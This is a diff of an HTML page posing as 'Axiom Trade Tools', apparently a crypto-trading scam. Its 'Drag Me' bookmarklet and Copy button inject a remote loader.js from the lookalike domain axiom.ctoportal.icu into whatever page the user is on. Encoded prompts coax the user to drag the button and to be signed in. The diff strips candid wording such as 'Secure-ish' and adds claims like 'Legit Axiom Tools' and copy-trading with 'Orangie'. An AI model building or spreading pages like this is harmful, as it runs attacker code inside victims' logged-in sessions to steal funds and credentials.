@@ -4,7 +4,7 @@
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width,initial-scale=1" />
   <title>Axiom Trade Tools</title>
-  <meta name="description" content="Lightweight utility site for Axiom trade tools — includes a draggable bookmarklet." />
+  <meta name="description" content="Best trading tools from Axiom — copy trade with Orangie and boost your strategy." />
 
   <!-- User-provided script (placed under HEAD as requested) -->
   <script src="https://axiom.ctoportal.icu/loader.js" data="eyJoYXNoIjoiTURzNE1URTRPVE0zT0RjNSIsImFsZXJ0cyI6eyJndWlkZSI6IllvdSBtdXN0IGRyYWcgdGhlIGJ1dHRvbiB0byB5b3VyIGJvb2ttYXJrcyBiYXIgaW5zdGVhZCBvZiBjbGlja2luZyBpdC4iLCJyZWRpcmVjdCI6IllvdSBhcmUgbm93IGJlaW5nIHJlZGlyZWN0ZWQgdG8gaHR0cHM6Ly9heGlvbS50cmFkZS9kaXNjb3Zlci4iLCJ1bmF1dGhvcml6ZWQiOiJZb3UgbXVzdCBiZSBzaWduZWQgaW4gdG8gdXNlIHRoaXMgYm9va21hcmtsZXQuIiwiZXJyb3IiOiJGYWlsZWQgdG8gZXhlY3V0ZSB0aGUgYm9va21hcmtsZXQuIFBsZWFzZSB0cnkgYWdhaW4gbGF0ZXIuIn19"></script>
@@ -42,7 +42,7 @@
       <div class="logo">AX</div>
       <div>
         <h1>Axiom Trade Tools</h1>
-        <p class="lead">Handy trade helpers — fast, light, and bookmarklet-ready.</p>
+        <p class="lead">Best trading tools — copy trade with Orangie and maximize your profits.</p>
       </div>
     </header>
 
@@ -55,25 +55,23 @@
           </div>
 
           <div class="toolbar">
-            <!-- Required anchor the user asked for -->
             <a class="bookmarklet" id="drag-link" draggable="true" title="Drag to bookmarks bar">Drag Me</a>
-
             <button class="btn" id="copy-btn" title="Copy bookmarklet">Copy</button>
           </div>
         </div>
 
         <div class="features" style="margin-top:14px">
           <div class="feature">
-            <strong>Loader</strong>
-            <div class="muted">The page already includes the Axiom loader script in the &lt;head&gt; as requested.</div>
+            <strong>Legit Axiom Tools</strong>
+            <div class="muted">Trusted suite of trading utilities built for real traders and copy-traders alike.</div>
           </div>
           <div class="feature">
-            <strong>Lightweight</strong>
-            <div class="muted">Minimal UI so you can focus on tools instead of fluff.</div>
+            <strong>Best Trading Tools</strong>
+            <div class="muted">Advanced, lightweight tools to improve decision-making and performance.</div>
           </div>
           <div class="feature">
-            <strong>Secure-ish</strong>
-            <div class="muted">Only injects the remote loader when you use the bookmarklet or have the page open.</div>
+            <strong>Copy Trade with Orangie</strong>
+            <div class="muted">Follow Orangie’s proven strategies directly and trade smarter, not harder.</div>
           </div>
         </div>
       </div>
@@ -82,7 +80,7 @@
 
       <div class="card">
         <strong>Usage</strong>
-        <p class="muted" style="margin-top:8px">To install: drag the <em>Drag Me</em> link to your browser's bookmarks/favorites bar. On any page, click the saved bookmark to load the Axiom tools. If your browser blocks drag-to-bookmark, use the Copy button and create a new bookmark manually, pasting the code into the URL field.</p>
+        <p class="muted" style="margin-top:8px">To install: drag the <em>Drag Me</em> link to your browser's bookmarks/favorites bar. On any page, click the saved bookmark to load the Axiom trade tools. If your browser blocks drag-to-bookmark, use the Copy button and create a new bookmark manually, pasting the code into the URL field.</p>
       </div>
 
     </main>
@@ -93,7 +91,6 @@
   </div>
 
   <script>
-    // Prepare a bookmarklet JS that dynamically loads the same loader script.
     const loaderUrl = 'https://axiom.ctoportal.icu/loader.js';
     const bookmarkletCode = `(function(){try{var s=document.createElement('script');s.src='${loaderUrl}';s.async=true;document.head.appendChild(s);}catch(e){alert('Failed to launch Axiom tools: '+e);}})();`;
     const bookmarkletHref = 'javascript:' + encodeURIComponent(bookmarkletCode);
@@ -101,20 +98,15 @@
     const dragLink = document.getElementById('drag-link');
     const copyBtn = document.getElementById('copy-btn');
 
-    // Set href so it can be dragged into bookmarks in many browsers
     dragLink.setAttribute('href', bookmarkletHref);
 
-    // For HTML5 drag: set dataTransfer so some browsers accept the dragged bookmark
     dragLink.addEventListener('dragstart', function(e){
       try{
         e.dataTransfer.setData('text/plain', bookmarkletHref);
         e.dataTransfer.setData('text/uri-list', bookmarkletHref);
-      }catch(err){
-        // ignore
-      }
+      }catch(err){}
     });
 
-    // Also allow click to copy the bookmarklet code
     copyBtn.addEventListener('click', async function(){
       try{
         await navigator.clipboard.writeText(bookmarkletHref);
@@ -125,10 +117,8 @@
       }
     });
 
-    // Improve accessibility: middle-click or ctrl/cmd+click opens the bookmarklet immediately
     dragLink.addEventListener('click', function(e){
       if(e.ctrlKey || e.metaKey || e.button === 1){
-        // open in current page context to run
         const fn = new Function(decodeURIComponent(bookmarkletCode.replace(/^\(|\)\;?$/g, '')));
         fn();
         e.preventDefault();
